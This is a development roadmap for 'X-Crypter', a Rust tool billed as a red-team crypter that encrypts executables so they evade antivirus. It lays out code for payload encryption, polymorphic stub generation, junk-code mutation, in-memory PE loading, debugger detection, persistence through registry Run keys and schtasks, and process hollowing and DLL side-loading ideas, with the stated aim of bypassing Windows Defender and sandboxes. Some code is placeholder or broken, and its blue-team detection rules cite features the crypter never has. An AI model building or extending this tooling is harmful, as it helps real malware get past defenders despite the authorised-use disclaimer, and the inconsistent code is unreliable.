# X-Crypter: Advanced Red Team EXE Crypter

## Polymorphic EXE Crypter - Complete Development Roadmap

---

## 🎯 Project Overview

**Project Name:** X-Crypter  
**Purpose:** Red Team EXE crypter that encrypts/obfuscates executables to evade detection  
**Language:** Rust (chosen for memory safety, error handling, and cross-compilation)  
**Goal:** Build a polymorphic crypter that produces unique encrypted executables per build  

### Key Features

- ✅ Encrypt/obfuscate payload executables
- ✅ Polymorphic stub generation (different hash every build)
- ✅ Multiple encryption algorithms (AES, XOR, RC4, custom)
- ✅ Anti-debugging and anti-analysis techniques in stub
- ✅ Memory-only execution (decrypt in memory, never write to disk)
- ✅ Code obfuscation and junk code insertion
- ✅ String encryption
- ✅ Import table obfuscation
- ✅ Daily mutation (no patterns)

---

## 📋 Project Structure

```
X-Crypter/
├── crypter/             # Main crypter tool
│   ├── src/
│   │   ├── main.rs      # CLI interface
│   │   ├── encryptor.rs  # Encryption engine (AES, XOR, RC4)
│   │   ├── stub_gen.rs  # Stub generator (polymorphic)
│   │   ├── obfuscator.rs # Code obfuscation
│   │   ├── mutator.rs   # Polymorphic engine
│   │   └── config.rs    # Build configuration
│   └── Cargo.toml
│
├── stub/                # Stub template (gets compiled per build)
│   ├── src/
│   │   ├── main.rs      # Entry point
│   │   ├── decryptor.rs # Decryption engine
│   │   ├── loader.rs    # PE loader (memory execution)
│   │   ├── evasion.rs   # Anti-debug/VM/sandbox
│   │   └── api_resolver.rs # Dynamic API resolution
│   └── Cargo.toml
│
├── payload/             # Test payloads
│   └── test_payload.exe
│
├── output/              # Encrypted executables
│
├── docs/
│   ├── ARCHITECTURE.md
│   ├── ENCRYPTION.md
│   ├── STUB_DESIGN.md
│   └── ETHICS.md
│
└── README.md
```

---

## 🗓️ Development Roadmap

---

# PHASE 1: FOUNDATION & ENCRYPTION ENGINE

**Timeline:** Week 1 (7 days)  
**Goal:** Build core infrastructure and encryption system

---

## Day 1: Project Setup & Architecture

### Tasks

1. **Initialize Rust Workspace**

   ```bash
   cd /Users/webdev/Documents/Sources/X-Crypter
   cargo new crypter --bin
   cargo new stub --bin
   ```

2. **Setup Dependencies**
   - Add to `crypter/Cargo.toml`:

     ```toml
     [dependencies]
     clap = "4.5"           # CLI argument parsing
     aes = "0.8"            # AES encryption
     rand = "0.8"           # Randomization
     sha2 = "0.10"          # Hashing
     hex = "0.4"            # Hex encoding
     chrono = "0.4"         # Timestamps
     ```

   - Add to `stub/Cargo.toml`:

     ```toml
     [dependencies]
     winapi = { version = "0.3", features = ["winuser", "processthreadsapi", "winnt", "memoryapi", "libloaderapi"] }
     windows = { version = "0.52", features = ["Win32_Foundation", "Win32_System_Memory"] }
     ```

3. **Create Documentation Structure**
   - Document project goals
   - Define threat model
   - Outline attack chain
   - Legal/ethical framework

### Deliverable

- ✅ Initialized Rust workspace
- ✅ Dependencies configured
- ✅ Documentation framework ready

---

## Day 2-3: Encryption Engine

### Concept

Build a multi-algorithm encryption engine that can encrypt payload executables using various methods.

### Encryption Algorithms

1. **AES-256-CBC** - Strong encryption, industry standard
2. **XOR** - Simple, fast, lightweight
3. **RC4** - Stream cipher, variable key length
4. **Custom** - Multi-layer encryption with random keys

### Encryption Flow

```
Input EXE → Read PE file → Extract .text section → Encrypt → Embed in stub
```

### Implementation Structure

```rust
pub enum EncryptionMethod {
    AES256,
    XOR,
    RC4,
    Custom,
}

pub struct Encryptor {
    method: EncryptionMethod,
    key: Vec<u8>,
    iv: Option<Vec<u8>>,
}
```

### Implementation

**File: `crypter/src/encryptor.rs`**

```rust
use aes::Aes256;
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyInit};
use cbc::Cbc;
use rand::Rng;
use std::fs;

pub enum EncryptionMethod {
    AES256,
    XOR,
    RC4,
    Custom,
}

pub struct Encryptor {
    method: EncryptionMethod,
    key: Vec<u8>,
    iv: Option<Vec<u8>>,
}

impl Encryptor {
    pub fn new(method: EncryptionMethod) -> Self {
        let (key, iv) = match method {
            EncryptionMethod::AES256 => {
                let key = Self::generate_key(32); // 256-bit key
                let iv = Some(Self::generate_key(16)); // 128-bit IV
                (key, iv)
            }
            EncryptionMethod::XOR => {
                let key = Self::generate_key(32);
                (key, None)
            }
            EncryptionMethod::RC4 => {
                let key = Self::generate_key(16);
                (key, None)
            }
            EncryptionMethod::Custom => {
                // Multi-layer: XOR + AES
                let key = Self::generate_key(32);
                let iv = Some(Self::generate_key(16));
                (key, iv)
            }
        };
        
        Self { method, key, iv }
    }
    
    fn generate_key(len: usize) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        (0..len).map(|_| rng.gen()).collect()
    }
    
    pub fn encrypt_file(&self, file_path: &str) -> Result<Vec<u8>, String> {
        let data = fs::read(file_path)
            .map_err(|e| format!("Failed to read file: {}", e))?;
        
        self.encrypt_data(&data)
    }
    
    pub fn encrypt_data(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        match self.method {
            EncryptionMethod::AES256 => self.encrypt_aes(data),
            EncryptionMethod::XOR => self.encrypt_xor(data),
            EncryptionMethod::RC4 => self.encrypt_rc4(data),
            EncryptionMethod::Custom => {
                // Multi-layer encryption
                let xor_encrypted = self.encrypt_xor(data)?;
                self.encrypt_aes(&xor_encrypted)
            }
        }
    }
    
    fn encrypt_aes(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        // AES-256-CBC encryption
        // Implementation using aes crate
        Ok(data.to_vec()) // Placeholder
    }
    
    fn encrypt_xor(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        let mut encrypted = Vec::with_capacity(data.len());
        let key_len = self.key.len();
        
        for (i, byte) in data.iter().enumerate() {
            encrypted.push(byte ^ self.key[i % key_len]);
        }
        
        Ok(encrypted)
    }
    
    fn encrypt_rc4(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        // RC4 stream cipher implementation
        Ok(data.to_vec()) // Placeholder
    }
    
    pub fn get_key(&self) -> &[u8] {
        &self.key
    }
    
    pub fn get_iv(&self) -> Option<&[u8]> {
        self.iv.as_deref()
    }
}

### Testing

```rust
#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_xor_encryption() {
        let encryptor = Encryptor::new(EncryptionMethod::XOR);
        let data = b"Hello, World!";
        
        let encrypted = encryptor.encrypt_data(data).unwrap();
        assert_ne!(data, encrypted.as_slice());
        
        // Decrypt (XOR is symmetric)
        let decryptor = Encryptor::new(EncryptionMethod::XOR);
        // Note: In real implementation, decryptor would use same key
    }
    
    #[test]
    fn test_file_encryption() {
        let encryptor = Encryptor::new(EncryptionMethod::AES256);
        let result = encryptor.encrypt_file("test_payload.exe");
        assert!(result.is_ok());
    }
}
```

### Deliverable

- ✅ Multi-algorithm encryption engine
- ✅ AES-256, XOR, RC4 support
- ✅ Custom multi-layer encryption
- ✅ Random key generation
- ✅ File encryption support
- ✅ Unit tests passing

---

## Day 4-5: Crypter CLI & Stub Generator

### Purpose

The Crypter tool encrypts payload executables and generates polymorphic stubs that decrypt and execute them.

### Features

1. **Command-line interface** for encrypting payloads
2. **Stub generator** that creates polymorphic decryptor stubs
3. **PE file embedding** (embed encrypted payload in stub)
4. **Output tracking** (build logs, hashes, encryption keys)

### Implementation

**File: `crypter/src/main.rs`**

```rust
use clap::{App, Arg};
use std::fs;
use std::path::PathBuf;

mod encryptor;
mod stub_gen;
mod obfuscator;
mod mutator;
mod config;

fn main() {
    let matches = App::new("X-Crypter")
        .version("1.0")
        .author("Red Team")
        .about("Polymorphic EXE Crypter - Encrypts executables with unique stubs")
        .arg(
            Arg::with_name("input")
                .short('i')
                .long("input")
                .value_name("FILE")
                .help("Path to payload executable to encrypt")
                .required(true)
                .takes_value(true),
        )
        .arg(
            Arg::with_name("output")
                .short('o')
                .long("output")
                .value_name("FILE")
                .help("Output encrypted executable filename")
                .default_value("encrypted.exe")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("method")
                .short('m')
                .long("method")
                .value_name("METHOD")
                .help("Encryption method: aes, xor, rc4, custom")
                .default_value("aes")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("anti-debug")
                .long("anti-debug")
                .help("Enable anti-debugging checks in stub"),
        )
        .arg(
            Arg::with_name("anti-vm")
                .long("anti-vm")
                .help("Enable anti-VM checks in stub"),
        )
        .arg(
            Arg::with_name("polymorphic")
                .short('p')
                .long("polymorphic")
                .help("Enable polymorphic stub generation (unique per build)"),
        )
        .get_matches();
    
    // Parse arguments
    let input_path = matches.value_of("input").unwrap();
    let output_path = matches.value_of("output").unwrap();
    let method_str = matches.value_of("method").unwrap();
    let anti_debug = matches.is_present("anti-debug");
    let anti_vm = matches.is_present("anti-vm");
    let polymorphic = matches.is_present("polymorphic");
    
    println!("╔════════════════════════════════════════╗");
    println!("║        X-Crypter v1.0                 ║");
    println!("║    Polymorphic EXE Crypter            ║");
    println!("╚════════════════════════════════════════╝\n");
    
    // Parse encryption method
    let method = match method_str {
        "aes" => encryptor::EncryptionMethod::AES256,
        "xor" => encryptor::EncryptionMethod::XOR,
        "rc4" => encryptor::EncryptionMethod::RC4,
        "custom" => encryptor::EncryptionMethod::Custom,
        _ => {
            eprintln!("[!] Invalid encryption method: {}", method_str);
            std::process::exit(1);
        }
    };
    
    println!("[+] Configuration:");
    println!("    Input: {}", input_path);
    println!("    Output: {}", output_path);
    println!("    Method: {}", method_str);
    println!("    Anti-Debug: {}", anti_debug);
    println!("    Anti-VM: {}", anti_vm);
    println!("    Polymorphic: {}", polymorphic);
    println!();
    
    // Encrypt payload
    println!("[+] Encrypting payload...");
    let encryptor = encryptor::Encryptor::new(method);
    let encrypted_data = encryptor.encrypt_file(input_path)
        .expect("Failed to encrypt payload");
    
    println!("    ✓ Payload encrypted ({} bytes)", encrypted_data.len());
    println!();
    
    // Generate polymorphic stub
    println!("[+] Generating polymorphic stub...");
    let stub_code = stub_gen::generate_stub(
        &encrypted_data,
        encryptor.get_key(),
        encryptor.get_iv(),
        anti_debug,
        anti_vm,
        polymorphic,
    );
    
    // Write stub code
    let stub_main_path = PathBuf::from("../stub/src/main.rs");
    fs::write(&stub_main_path, stub_code).expect("Failed to write stub code");
    
    println!("    ✓ Stub code generated");
    println!();
    
    // Compile stub with embedded payload
    println!("[+] Compiling encrypted executable...");
    stub_gen::compile_stub(output_path, &encrypted_data);
    
    println!("    ✓ Encrypted executable compiled: {}", output_path);
    println!();
    
    // Calculate hash
    let hash = mutator::calculate_hash(output_path);
    println!("[+] Output hash (SHA256): {}", hash);
    println!();
    
    println!("╔════════════════════════════════════════╗");
    println!("║       Encryption Complete!            ║");
    println!("╚════════════════════════════════════════╝");
    println!("\n[!] Remember: This is a RED TEAM tool.");
    println!("[!] Use only in authorized environments.");
}
```

**File: `crypter/src/stub_gen.rs`**

```rust
use crate::encryptor::EncryptionMethod;
use rand::Rng;

pub struct StubConfig {
    pub encrypted_payload: Vec<u8>,
    pub encryption_key: Vec<u8>,
    pub encryption_iv: Option<Vec<u8>>,
    pub encryption_method: EncryptionMethod,
    pub anti_debug: bool,
    pub anti_vm: bool,
    pub polymorphic: bool,
}

pub fn generate_stub(
    encrypted_data: &[u8],
    key: &[u8],
    iv: Option<&[u8]>,
    anti_debug: bool,
    anti_vm: bool,
    polymorphic: bool,
) -> String {
    let mut code = String::new();
    
    // Header
    code.push_str("// X-Crypter Stub - AUTO-GENERATED\n");
    code.push_str("// Build time: ");
    code.push_str(&chrono::Local::now().to_string());
    code.push_str("\n\n");
    
    // Imports
    code.push_str("#![windows_subsystem = \"windows\"]\n");
    code.push_str("use std::ptr;\n");
    code.push_str("use winapi::um::memoryapi::*;\n");
    code.push_str("use winapi::um::libloaderapi::*;\n");
    code.push_str("use winapi::um::winnt::*;\n\n");
    
    // Embedded encrypted payload
    code.push_str("const ENCRYPTED_PAYLOAD: &[u8] = &[\n");
    for chunk in encrypted_data.chunks(16) {
        code.push_str("    ");
        for byte in chunk {
            code.push_str(&format!("0x{:02x}, ", byte));
        }
        code.push_str("\n");
    }
    code.push_str("];\n\n");
    
    // Encryption key (obfuscated)
    code.push_str("const ENCRYPTION_KEY: &[u8] = &[\n");
    for chunk in key.chunks(16) {
        code.push_str("    ");
        for byte in chunk {
            code.push_str(&format!("0x{:02x}, ", byte));
        }
        code.push_str("\n");
    }
    code.push_str("];\n\n");
    
    // Main function
    code.push_str("fn main() {\n");
    
    // Anti-debug check
    if anti_debug {
        code.push_str("    if check_debugger() {\n");
        code.push_str("        std::process::exit(0);\n");
        code.push_str("    }\n\n");
    }
    
    // Anti-VM check
    if anti_vm {
        code.push_str("    if check_vm() {\n");
        code.push_str("        std::process::exit(0);\n");
        code.push_str("    }\n\n");
    }
    
    // Decrypt payload
    code.push_str("    let decrypted = decrypt_payload(ENCRYPTED_PAYLOAD, ENCRYPTION_KEY);\n\n");
    
    // Execute in memory
    code.push_str("    execute_in_memory(&decrypted);\n");
    code.push_str("}\n\n");
    
    // Helper functions
    code.push_str(r#"
fn decrypt_payload(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
    // Decryption logic based on encryption method
    // XOR decryption example:
    let mut decrypted = Vec::with_capacity(encrypted.len());
    for (i, byte) in encrypted.iter().enumerate() {
        decrypted.push(byte ^ key[i % key.len()]);
    }
    decrypted
}

fn execute_in_memory(pe_data: &[u8]) {
    // PE loader - load and execute from memory
    // Implementation in loader.rs
}

fn check_debugger() -> bool {
    // Anti-debug implementation
    false
}

fn check_vm() -> bool {
    // Anti-VM implementation
    false
}
"#);
    
    code
}

pub fn compile_stub(output_path: &str, encrypted_data: &[u8]) {
    // Compile stub with embedded payload
    use std::process::Command;
    
    let status = Command::new("cargo")
        .args(&["build", "--release", "--manifest-path", "../stub/Cargo.toml"])
        .status()
        .expect("Failed to compile stub");
    
    if !status.success() {
        eprintln!("Compilation failed!");
        std::process::exit(1);
    }
    
    // Copy to output location
    std::fs::copy("../stub/target/release/stub.exe", output_path)
        .expect("Failed to copy encrypted executable");
}
```

### Deliverable

- ✅ Stub generator with embedded payload
- ✅ Polymorphic code generation
- ✅ Anti-analysis integration
- ✅ Compilation automation

---

## Day 6-7: Polymorphic Engine & Code Obfuscation

### Purpose

Generate unique stub binaries that:

- Have different file hashes each build
- Use different code patterns
- Randomize instruction order
- Change variable names
- Insert junk code
- Obfuscate strings and API calls

### Techniques

#### 1. **Code Obfuscation**

```rust
// Original
let key = ENCRYPTION_KEY;
decrypt_payload(data, key);

// Obfuscated (random per build)
let k = ENCRYPTION_KEY;
let mut k_ptr = k.as_ptr();
let decrypted = decrypt(data, k_ptr, k.len());
```

#### 2. **Junk Code Insertion**

```rust
// Insert random no-op functions
fn random_junk_1() {
    let _ = std::time::SystemTime::now();
    std::hint::black_box(0u32);
}

fn random_junk_2() {
    let _ = std::env::current_dir();
    let _ = std::thread::current().id();
}
```

#### 3. **Instruction Reordering**

```rust
// Order 1
check_debugger();
decrypt_payload();
execute_in_memory();

// Order 2 (same result, different binary)
decrypt_payload();
check_debugger();
execute_in_memory();
```

#### 4. **Variable Name Randomization**

```rust
// Build 1
let encrypted_data = ENCRYPTED_PAYLOAD;

// Build 2
let payload = ENCRYPTED_PAYLOAD;

// Build 3
let enc_buf = ENCRYPTED_PAYLOAD;
```

#### 5. **String Obfuscation**

```rust
// Encrypt all string literals
let api_name = decrypt_string(&[0x48, 0x65, 0x6c, 0x6c, 0x6f]); // "Hello"
```

**File: `crypter/src/mutator.rs`**

```rust
use rand::Rng;
use rand::seq::SliceRandom;
use sha2::{Sha256, Digest};
use std::fs;

/// Generate random variable name
pub fn random_var_name() -> String {
    let prefixes = ["var", "tmp", "val", "data", "obj", "ptr", "ref", "buf", "mem"];
    let suffixes = ["1", "2", "x", "y", "a", "b", "c", "d"];
    
    let mut rng = rand::thread_rng();
    let prefix = prefixes.choose(&mut rng).unwrap();
    let suffix = suffixes.choose(&mut rng).unwrap();
    
    format!("{}_{}", prefix, suffix)
}

/// Generate junk code
pub fn generate_junk_code() -> String {
    let junk_templates = vec![
        "let _ = std::time::SystemTime::now();",
        "let _ = std::env::current_dir();",
        "let _ = std::thread::current().id();",
        "std::hint::black_box(0u32);",
        "let _ = std::mem::size_of::<usize>();",
    ];
    
    let mut rng = rand::thread_rng();
    junk_templates.choose(&mut rng).unwrap().to_string()
}

/// Obfuscate string literal
pub fn obfuscate_string(s: &str) -> (Vec<u8>, Vec<u8>) {
    let key: Vec<u8> = (0..s.len()).map(|_| rand::thread_rng().gen()).collect();
    let encrypted: Vec<u8> = s.bytes()
        .zip(key.iter())
        .map(|(b, k)| b ^ k)
        .collect();
    (encrypted, key)
}

/// Calculate SHA256 hash
pub fn calculate_hash(file_path: &str) -> String {
    let contents = fs::read(file_path).expect("Failed to read file");
    let mut hasher = Sha256::new();
    hasher.update(&contents);
    let result = hasher.finalize();
    hex::encode(result)
}
```

### Deliverable

- ✅ Polymorphic code generation utilities
- ✅ Random variable name generation
- ✅ Junk code insertion
- ✅ String obfuscation
- ✅ Hash calculation

---

# PHASE 2: STUB IMPLEMENTATION

**Timeline:** Week 2 (7 days)  
**Goal:** Build the stub that decrypts and executes payloads in memory

---

## Day 8-9: Stub Core & Decryptor

**File: `stub/src/main.rs`**  
**File: `stub/src/decryptor.rs`**

### Features

1. Decrypt embedded payload at runtime
2. Support multiple decryption algorithms
3. Memory-only operations (no disk writes)
4. Extract PE from decrypted data

### Implementation

```rust
// stub/src/decryptor.rs
pub fn decrypt_payload(
    encrypted: &[u8],
    key: &[u8],
    method: EncryptionMethod,
) -> Result<Vec<u8>, String> {
    match method {
        EncryptionMethod::AES256 => decrypt_aes(encrypted, key),
        EncryptionMethod::XOR => decrypt_xor(encrypted, key),
        EncryptionMethod::RC4 => decrypt_rc4(encrypted, key),
        EncryptionMethod::Custom => {
            // Multi-layer: decrypt AES then XOR
            let aes_decrypted = decrypt_aes(encrypted, key)?;
            decrypt_xor(&aes_decrypted, key)
        }
    }
}

fn decrypt_xor(encrypted: &[u8], key: &[u8]) -> Result<Vec<u8>, String> {
    let mut decrypted = Vec::with_capacity(encrypted.len());
    for (i, byte) in encrypted.iter().enumerate() {
        decrypted.push(byte ^ key[i % key.len()]);
    }
    Ok(decrypted)
}
```

---

## Day 10-11: PE Loader & Memory Execution

**File: `stub/src/loader.rs`**

### Features

1. Parse PE headers from decrypted data
2. Allocate memory for PE sections
3. Resolve imports dynamically
4. Execute payload in memory (no disk write)

### Implementation

```rust
// stub/src/loader.rs
pub fn execute_in_memory(pe_data: &[u8]) -> Result<(), String> {
    // 1. Parse PE headers
    let pe = parse_pe(pe_data)?;
    
    // 2. Allocate memory for image
    let image_base = allocate_memory(pe.size_of_image)?;
    
    // 3. Copy sections to allocated memory
    copy_sections(pe_data, image_base, &pe.sections)?;
    
    // 4. Resolve imports
    resolve_imports(image_base, &pe.imports)?;
    
    // 5. Fix relocations
    apply_relocations(image_base, &pe.relocations)?;
    
    // 6. Execute entry point
    let entry_point = image_base + pe.entry_point;
    execute_entry_point(entry_point)?;
    
    Ok(())
}
```

---

## Day 10-11: Anti-Analysis Techniques

### Anti-Debugging

```rust
// Check if debugger is present
fn check_debugger() -> bool {
    unsafe {
        let peb = get_peb();
        (*(peb as *const u8).offset(2)) != 0 // BeingDebugged flag
    }
}

// Timing check
fn timing_check() -> bool {
    let start = std::time::Instant::now();
    std::thread::sleep(std::time::Duration::from_millis(10));
    let elapsed = start.elapsed().as_millis();
    elapsed > 50 // Debugger adds delay
}
```

### Anti-VM

```rust
// Check for VM indicators
fn check_vm() -> bool {
    // Check registry for VMware/VirtualBox
    // Check for VM processes
    // Check CPUID instructions
    false
}
```

### Anti-Sandbox

```rust
// Sandbox evasion
fn check_sandbox() -> bool {
    // Check mouse movement (sandbox = no mouse)
    // Check if running time < 2 minutes (sandbox timeout)
    // Check for sandbox DLLs
    false
}
```

---

## Day 12-13: Persistence Mechanisms

### Registry Run Key

```rust
fn persist_registry(exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    use windows::Win32::System::Registry::*;
    
    // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    // Add entry: "SystemUpdate" = "C:\path\to\dropper.exe"
    
    Ok(())
}
```

### Scheduled Task

```rust
fn persist_scheduled_task() -> Result<(), Box<dyn std::error::Error>> {
    // Use schtasks.exe to create daily task
    std::process::Command::new("schtasks")
        .args(&["/create", "/tn", "SystemUpdate", "/tr", exe_path, "/sc", "daily"])
        .output()?;
    
    Ok(())
}
```

### WMI Event Subscription

```rust
// Advanced persistence using WMI
```

---

## Day 12-13: Dynamic API Resolution

**File: `stub/src/api_resolver.rs`**

### Features

1. Resolve Windows APIs dynamically (no import table)
2. Obfuscate API names
3. Hash-based API lookup
4. Avoid suspicious API calls

### Implementation

```rust
// stub/src/api_resolver.rs
pub struct ApiResolver {
    ntdll_base: *mut u8,
    kernel32_base: *mut u8,
}

impl ApiResolver {
    pub fn new() -> Result<Self, String> {
        let ntdll = get_module_base("ntdll.dll")?;
        let kernel32 = get_module_base("kernel32.dll")?;
        Ok(Self {
            ntdll_base: ntdll,
            kernel32_base: kernel32,
        })
    }
    
    pub fn get_proc_address(&self, module: *mut u8, api_hash: u32) -> Option<*mut u8> {
        // Resolve API by hash instead of name
        resolve_api_by_hash(module, api_hash)
    }
}
```

---

## Day 14: Testing & Integration

### Features

1. Test encryption/decryption cycle
2. Verify memory execution works
3. Test anti-analysis bypasses
4. Validate polymorphic generation

---

# PHASE 3: POLISH & OPTIMIZATION

**Timeline:** Week 3, Days 15-21

---

## Detection Signatures

### YARA Rule

**File: `blue-team/yara/xcrypter.yar`**

```yara
rule XCrypter_IPv6_Dropper {
    meta:
        description = "Detects X-Crypter polymorphic dropper"
        author = "Blue Team"
        date = "2026-01-11"
        severity = "critical"
    
    strings:
        $ipv6_1 = { 32 30 30 31 3a } // "2001:" in hex
        $ipv6_2 = { 66 65 38 30 3a } // "fe80:" in hex
        $sleep = "thread::sleep" ascii
        
    condition:
        uint16(0) == 0x5A4D and // PE header
        (#ipv6_1 > 5 or #ipv6_2 > 5) and
        $sleep and
        filesize < 5MB
}
```

### Sigma Rule

**File: `blue-team/sigma/xcrypter_execution.yml`**

```yaml
title: X-Crypter Polymorphic Dropper Execution
description: Detects polymorphic dropper execution patterns
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - CommandLine|contains: '.url'
        - CommandLine|contains: '\\\\'
        - ParentImage|endswith: 'explorer.exe'
    condition: selection
falsepositives:
    - Legitimate .url file usage
level: high
```

### EDR Detection

**File: `blue-team/iocs/behavioral_indicators.md`**

```markdown
# Behavioral Indicators for X-Crypter

## Process Behavior:
1. **Long sleep immediately after start** (>120 seconds)
2. **IPv6 API calls followed by memory allocation**
3. **Creation of .url or .lnk files**
4. **Remote UNC path access to unusual IPs**
5. **Self-deletion after execution**

## Memory Indicators:
- Strings that decode from IPv6 addresses
- Executable code generated at runtime
- UNC paths in memory

## Network Indicators:
- SMB/CIFS traffic (port 445 or custom)
- HTTP requests with suspicious UNC paths
- IPv6 DNS lookups followed by remote execution

## File System Indicators:
- .url files with UNC paths
- .lnk files with WorkingDirectory = UNC path
- Temporary executables in network cache
```

---

## Mitigation Strategies

**File: `blue-team/mitigations.md`**

```markdown
# Mitigation Strategies for X-Crypter

## Immediate Actions:
1. **Restrict remote code execution** from UNC paths
2. **Block suspicious SMB/CIFS traffic** at firewall (ports 445, 139)
3. **Monitor .url/.lnk file creation**
4. **Deploy behavioral detection** for polymorphic binaries

## Detection

1. **Deploy YARA rules** on endpoints
2. **Enable Sigma rules** in SIEM
3. **Monitor for:**
   - Long sleep patterns in new processes
   - IPv6 string parsing + memory allocation
   - UNC path access to external IPs
   - .url file execution

## Response

1. **Isolate affected system**
2. **Dump memory** (look for IPv6 instructions)
3. **Capture network traffic**
4. **Collect .url/.lnk artifacts**
5. **Check persistence mechanisms**:
   - Registry Run keys
   - Scheduled tasks
   - WMI subscriptions

## Long-term

1. **Application whitelisting** (block unknown executables)
2. **Behavioral EDR** (not just signatures)
3. **Memory scanning** at runtime
4. **Network segmentation** (limit UNC path access)

```

---

# ADVANCED FEATURES (Optional)
**Timeline:** Week 4

---

## Advanced Option 1: Process Hollowing

Instead of direct execution, hollow a legitimate process:

```rust
// 1. Create suspended process (svchost.exe)
// 2. Unmap original image
// 3. Allocate memory for payload
// 4. Write decrypted payload
// 5. Resume execution
```

**Benefit:** Appears as legitimate process, harder to detect.

---

## Advanced Option 2: Multi-Layer Encryption

```
Layer 1: XOR with random key
Layer 2: AES-256 encryption
Layer 3: RC4 stream cipher
Layer 4: Custom algorithm
```

**Benefit:** Multiple decryption layers make analysis harder.

---

## Advanced Option 3: Legitimate Binary Hijacking

Instead of new EXE, hijack legitimate signed binary:

```
C:\Windows\System32\consent.exe (UAC prompt)
    ↓
DLL side-loading with X-Crypter payload
    ↓
Signed binary executes, loads malicious DLL
```

**Benefit:** Signed binary = trusted by AV.

---

## Advanced Option 3: Import Table Obfuscation

Hide API imports:

```rust
// Instead of import table, resolve APIs dynamically
// Use hash-based API lookup
// Resolve at runtime only when needed
```

**Benefit:** No suspicious imports visible in PE headers.

---

# TESTING & VALIDATION

**Timeline:** Ongoing throughout development

---

## Test Environment Setup

```
Isolated Lab Network:
├── Windows 10/11 VM (clean, no AV)
├── Windows 10/11 VM (with Windows Defender)
├── Windows 10/11 VM (with enterprise EDR)
├── Remote Server (for payload hosting)
└── Blue Team monitoring station
```

## Test Cases

### Test 1: Basic Encryption/Decryption

- Encrypt test payload with each method (AES, XOR, RC4, Custom)
- Verify encrypted executable decrypts correctly
- Confirm payload executes in memory
- Verify no disk writes occur

### Test 2: Polymorphism

- Build 10 different encrypted executables with same payload
- Verify each has unique SHA256 hash
- Compare code patterns (should differ)
- Submit to VirusTotal (in research mode)
- Confirm no signature matches

### Test 3: Anti-Debug

- Attach debugger (x64dbg, WinDbg) to encrypted executable
- Verify stub exits immediately when debugger detected
- Test timing checks
- Verify PEB checks work

### Test 4: Anti-VM

- Execute on VMware, VirtualBox, Hyper-V
- Verify stub detects VM environment
- Test registry checks
- Verify CPUID checks

### Test 5: Memory Execution

- Execute encrypted payload
- Monitor with Process Monitor
- Verify no file writes to disk
- Confirm payload runs from memory only
- Check memory dumps for decrypted payload

### Test 6: PE Loader

- Test with various payload types (console, GUI, DLL)
- Verify imports resolve correctly
- Confirm relocations apply properly
- Test with ASLR enabled/disabled

### Test 7: Evasion Testing

- Test against Windows Defender
- Test against enterprise EDR solutions
- Run in sandbox environments
- Verify evasion techniques work

---

# DOCUMENTATION REQUIREMENTS

---

## Required Documents

### 1. **ARCHITECTURE.md**

- System design
- Component interaction
- Data flow diagrams
- Encryption/decryption flow

### 2. **ENCRYPTION.md**

- Encryption algorithms
- Key generation
- Decryption process
- Examples

### 3. **STUB_DESIGN.md**

- Stub architecture
- PE loader implementation
- Memory execution techniques
- API resolution

### 4. **ETHICS.md**

- Legal disclaimer
- Authorized use only
- Red team guidelines
- Responsible disclosure

### 4. **USER_GUIDE.md**

- Crypter usage
- Command-line options
- Examples
- Troubleshooting

---

# SUCCESS CRITERIA

---

## Red Team Success Criteria

- ✅ Encrypts payload executables successfully
- ✅ Generates unique encrypted executables per build (polymorphism)
- ✅ Decrypts and executes payloads in memory (no disk writes)
- ✅ Bypasses Windows Defender (initially)
- ✅ Evades sandbox analysis
- ✅ Defeats debugger attachment
- ✅ Detects VM environments
- ✅ Each build produces different hash
- ✅ Multiple encryption methods supported
- ✅ PE loader works correctly

---

# TIMELINE SUMMARY

```
Week 1: Foundation (Days 1-7)
├── Day 1: Project setup
├── Day 2-3: Encryption engine
├── Day 4-5: Crypter CLI & stub generator
└── Day 6-7: Polymorphic engine

Week 2: Stub Implementation (Days 8-14)
├── Day 8-9: Stub core & decryptor
├── Day 10-11: PE loader & memory execution
├── Day 12-13: Dynamic API resolution
└── Day 14: Testing & integration

Week 3: Polish & Optimization (Days 15-21)
├── Day 15-17: Code optimization & size reduction
├── Day 18-21: Advanced evasion techniques
└── Testing & validation

Week 4: Advanced (Optional)
├── Process hollowing
├── Multi-layer encryption
├── Import table obfuscation
└── Final testing
```

---

# LEGAL & ETHICAL CONSIDERATIONS

---

## CRITICAL REMINDERS

⚠️ **THIS IS A RED TEAM TOOL**

- For authorized security testing ONLY
- Requires written permission
- Use in isolated lab environment
- Do NOT distribute publicly
- Do NOT use for malicious purposes

## Before Starting

1. [ ] Obtain written authorization from CISO/Management
2. [ ] Define scope (systems, timeframe, methods)
3. [ ] Coordinate with blue team
4. [ ] Setup isolated test environment
5. [ ] Prepare incident response plan
6. [ ] Document everything

## Ethical Guidelines

- Offensive security for defensive improvement
- Responsible disclosure of findings
- No unauthorized access
- No harm to systems or data
- No distribution outside organization

---

# FINAL NOTES

This tool demonstrates advanced adversary techniques for EXE crypter development. The goal is to:

1. **Build a polymorphic crypter** that generates unique encrypted executables
2. **Test evasion capabilities** against security products
3. **Understand crypter techniques** used by real attackers
4. **Improve red team capabilities** for authorized testing

By building this as a red team tool, you'll understand how advanced crypters work and can better test defensive capabilities.

**Good luck, and remember: with great power comes great responsibility.** 🛡️

---

## Next Steps

Run this to get started:

```bash
cd /Users/webdev/Documents/Sources/X-Crypter
cargo new crypter --bin
cargo new stub --bin
```

Then follow Day 1 tasks above! 🚀
